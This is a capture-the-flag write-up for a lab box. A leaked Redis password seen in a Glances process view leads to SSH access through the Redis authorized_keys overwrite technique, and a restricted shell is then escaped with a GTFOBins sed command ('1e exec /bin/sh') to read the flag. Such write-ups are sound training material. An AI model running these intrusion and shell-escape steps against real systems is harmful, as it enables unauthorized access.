Running nmap with `-sV -p1-65535` on the machine returns the following:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-26 01:03 BST

```

Examining the service on port 8000 shows the program `glances`[1] running. This
shows a list of processes, but not in enough detail. Looking at the docs we can
see it has a way of showing all the options, which is the `/` command.

From this, we can see that the redis is being ran with:
```
su tom -c redis-server --bind 0.0.0.0 --requirepass redis_is_really_secure
```

So we can now access redis. 

```
10.10.2.6:6379> auth redis_is_really_secure
OK
10.10.2.6:6379> keys *
(empty list or set)
```

So we can see there is no keys, so we have to think of another way to exploit.

There is an article [2] by the author of Redis, showing you how to overwrite the
file authorized_keys to allow login via ssh.

A session exploiting this:

```
$ ssh-keygen
Generating public/private rsa key pair.                                       
Enter file in which to save the key (/home/a/.ssh/id_rsa): /tmp/example/id_rsa
Enter passphrase (empty for no passphrase):                                   
Enter same passphrase again:                                                  
Your identification has been saved in /tmp/example/id_rsa.                    
Your public key has been saved in /tmp/example/id_rsa.pub.                    
The key fingerprint is:

```

Now that we can login, we see that we are given a restricted shell.

When we look into what binaries we can run, we can see that we can use `ls` and
`sed`.

GTFOBins lists a way of abusing sed, but this needs to be modified to use the
full path of our shell as it isn't in our `PATH`.

```
tom@9f10564a2db5:~$ sed -n '1e exec /bin/sh 1>&0' /etc/hosts
$ /bin/cat user.txt
CTF{wait_ssh_can_still_read_that}
```

So we've got our flag.
